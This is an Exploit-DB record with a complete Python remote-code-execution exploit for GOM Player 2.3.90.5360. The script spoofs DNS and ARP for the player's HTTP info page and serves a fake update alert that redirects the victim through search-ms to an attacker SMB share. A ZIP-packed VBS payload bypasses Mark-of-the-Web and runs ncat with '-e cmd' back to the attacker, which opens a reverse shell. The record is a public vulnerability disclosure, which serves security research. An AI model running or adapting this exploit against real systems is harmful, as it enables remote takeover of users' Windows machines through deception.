{"source": "https://www.exploit-db.com/exploits/51719", "vulnName": "GOM Player 2.3.90.5360 - Remote Code Execution (RCE)", "vulnEDBID": "51719", "vulnCVE": "N/A", "author": "M. AKIL G\u00dcNDO\u011eAN", "exploitType": "REMOTE", "platform": "WINDOWS", "datePublished": "2023-09-08", "vulnContent": "# Exploit Title: GOM Player 2.3.90.5360 - Remote Code Execution (RCE)\n# Date: 26.08.2023\n# Author: M. Akil G\u00fcndo\u011fan\n# Contact: https://twitter.com/akilgundogan\n# Vendor Homepage: https://www.gomlab.com/gomplayer-media-player/\n# Software Link: https://cdn.gomlab.com/gretech/player/GOMPLAYERGLOBALSETUP_NEW.EXE\n# Version: 2.3.90.5360 \n# Tested on: Windows 10 Pro x64 22H2 19045.3324\n# PoC Video: https://www.youtube.com/watch?v=8d0YUpdPzp8\n\n# Impacts: GOM player has been downloaded 63,952,102 times according to CNET. It is used by millions of people worldwide.\n\n# Vulnerability Description: \n# The IE component in the GOM Player's interface uses an insecure HTTP connection. Since IE is vulnerable to the \n# SMB/WebDAV+ \"search-ms\" technique, we can redirect the victim to the page we created with DNS spoofing and execute code on the target.\n# In addition, the URL+ZIP+VBS MoTW bypass technique was used to prevent the victim from seeing any warning in the pop-up window. \n\n# Full disclosure, developers should be more careful about software security.\n\n# Exploit Usage: Run it and enter the IP address of the target. Then specify the port to listen to for the reverse shell.\n\n# Some spaghetti and a bad code but it works :)\n\nbanner = \"\"\"\\033[38;5;196m+-----------------------------------------------------------+\n|     GOM Player 2.3.90.5360 - Remote Code Execution        |\n|   Test edildi, sinifta kaldi. Bu oyun hic bitmeyecek :-)  |\n+-----------------------------------------------------------+\\033[0m\"\"\" +\"\"\" \n\\033[38;5;117m[*]- Author: M. Akil Gundogan - rootkit.com.tr\\n\\033[0m\"\"\"\n\nimport time,os,zipfile,subprocess,socket,sys\n\nprint(banner)\n\nif os.geteuid() != 0:\n    print(\"You need root privileges to run the exploit, please use sudo...\")\n    sys.exit(1)\n\ntargetIP = input(\"- Target IP address: \")\nlistenPort = input(\"- Listening port for Reverse Shell: \")\n\ndef fCreate(fileName,fileContent): # File create func. \n    f = open(fileName,\"w\")\n    f.write(fileContent)\n    f.close()    \n\ngw = os.popen(\"ip -4 route show default\").read().split()\ns = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ns.connect((gw[2], 0))\nipaddr = s.getsockname()[0]\ngateway = gw[2]\nhost = socket.gethostname()\nprint (\"- My IP:\", ipaddr, \" Gateway:\", gateway, \" Host:\", host) \n\nprint(\"\\n[*]- Stage 1: Downloading neccesary tools...\")\n\nsmbFolderName = \"GomUpdater\" # change this (optional)\nexpWorkDir = \"gomExploitDir\" # change this (optional)\nos.system(\"mkdir \" + expWorkDir +\" >/dev/null 2>&1 &\") # Creating a working directory for the exploit.\ntime.sleep(1) # It's necessary for exploit stability. \nos.system(\"cd \" + expWorkDir + \"&& mkdir smb-shared web-shared >/dev/null 2>&1 &\") # Creating a working directory for the exploit.\ntime.sleep(1) # It's necessary for exploit stability. \nos.system(\"cd \" + expWorkDir + \"/smb-shared && wget https://nmap.org/dist/ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && unzip -o -j ncat-portable-5.59BETA1.zip >/dev/null 2>&1 && rm -rf ncat-portable-5.59BETA1.zip README\") #Downloading ncat\nprint(\"    [*] - Ncat has been downloaded.\")\nsubprocess.run(\"git clone https://github.com/fortra/impacket.git \" + expWorkDir + \"/impacket >/dev/null 2>&1\",shell=True) # Downloading Impacket\nprint(\"    [*] - Impacket has been downloaded.\")\nsubprocess.run(\"git clone https://github.com/dtrecherel/DNSSpoof.git \" + expWorkDir + \"/dnsspoof >/dev/null 2>&1\",shell=True) # Downloading DNSSpoof.py\nprint(\"    [*] - DNSSpoof.py has been downloaded.\")\n\nprint(\"[*]- Stage 2: Creating Attacker SMB Server...\")\nsubprocess.Popen(\"cd gomExploitDir/impacket/examples && python3 smbserver.py \"+smbFolderName+\" ../../smb-shared -smb2support >/dev/null 2>&1\",shell=True) # Running SMB server.\ntime.sleep(5) # It's necessary for exploit stability. \n\nsmbIP = ipaddr\nspoofUrl = \"playinfo.gomlab.com\" # Web page that causes vulnerability because it is used as HTTP\n\nprint(\"[*]- Stage 3: Creating Attacker Web Page...\")\n\n# change this (optional) \nscreenExpPage = \"\"\"\n<meta charset=\"utf-8\">\n<script> window.alert(\"GOM Player i\u00e7in acil g\u00fcncelleme yap\u0131lmal\u0131 ! A\u00e7\u0131lan pencerede l\u00fctfen updater'a t\u0131klay\u0131n.\");</script> \n<script>window.location.href= 'search-ms:displayname=GOM Player Updater&crumb=System.Generic.String%3AUpdater&crumb=location:%5C%5C\"\"\"+smbIP+\"\"\"';\n</script>\n\"\"\"\n\nfCreate(expWorkDir + \"/web-shared/screen.html\",screenExpPage)\ntime.sleep(3) # It's necessary for exploit stability. \n\nprint(\"[*]- Stage 4: Creating URL+VBS for MoTW bypass placing it into the ZIP archive...\")\nvbsCommand = '''Set shell=CreateObject(\"wscript.shell\") \nShell.Run(\"xcopy /y \\\\\\\\yogurt\\\\ayran\\\\ncat.exe %temp%\")\nWScript.Sleep 5000\nShell.Run(\"cmd /c start /min cmd /c %temp%\\\\ncat.exe attackerIP attackerPort -e cmd\")''' # change this (optional)\nvbsCommand = vbsCommand.replace(\"yogurt\", smbIP).replace(\"ayran\", smbFolderName).replace(\"attackerIP\",smbIP).replace(\"attackerPort\",listenPort)\nfCreate(expWorkDir + \"/payload.vbs\",vbsCommand)\n\nurlShortcut = '''[InternetShortcut]\nURL=file://'''+smbIP+\"/\"+smbFolderName+'''/archive.zip/payload.vbs\nIDlist='''\nfCreate(expWorkDir + \"/smb-shared/Updater.url\",urlShortcut)\ntime.sleep(3) # It's necessary for exploit stability. \nzipName = expWorkDir + \"/smb-shared/archive.zip\"\npayload_filename = os.path.join(expWorkDir, \"payload.vbs\")  \n\nwith zipfile.ZipFile(zipName, \"w\") as malzip:\n    malzip.write(payload_filename, arcname=os.path.basename(payload_filename))\n\nprint(\"[*]- Stage 5: Running the attacker's web server...\")\nsubprocess.Popen(\"cd \" + expWorkDir + \"/web-shared && python3 -m http.server 80 >/dev/null 2>&1\",shell=True) # Running attacker web server with Python mini http.server\ntime.sleep(3) # It's necessary for exploit stability. \n\nprint(\"[*]- Stage 6: Performing DNS and ARP spoofing for the target...\")\nsubprocess.Popen(\"python3 \" + expWorkDir + \"/dnsspoof/dnsspoof.py -d \" + spoofUrl + \" -t \" + targetIP + \">/dev/null 2>&1\",shell=True) # DNS Spoofing...\ntime.sleep(10) # It's neccesary for exploit stability.\nos.system(\"ping -c 5 \" + targetIP + \" >/dev/null 2>&1 &\") # Ping the target... \nos.system(\"arping -c 5 \" + targetIP + \" >/dev/null 2>&1 &\") # ARPing the target.\nprint(\"[*]- Stage 7: Waiting for the target to open GOM Player and execute the malicious URL shortcut...\\n\")\nsubprocess.run(\"nc -lvnp \" + listenPort,shell=True)\nsubprocess.run(\"pkill -f smbserver.py & pkill -f http.server & pkill -f dnsspoof.py\",shell=True) # Closing background processes after exploitation...\n            "}